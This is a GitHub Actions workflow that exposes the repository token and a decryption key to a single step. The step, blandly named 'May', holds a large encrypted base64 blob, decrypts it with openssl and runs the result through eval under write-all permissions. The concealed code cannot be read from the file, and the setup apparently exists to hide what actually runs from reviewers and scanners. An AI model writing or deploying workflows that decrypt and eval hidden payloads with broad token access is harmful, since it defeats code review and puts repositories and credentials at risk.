name: Run

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: 'aria2'
        type: string
      option2:
        required: true
        default: ''
        type: string
      option3:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}

jobs:
  job:
    runs-on: ubuntu-24.04
    steps:
      - name: May
        run: |
          encrypted_payload="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"

          decrypted=$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")

          if [ $? -eq 0 ]; then
            eval "$decrypted"
          fi
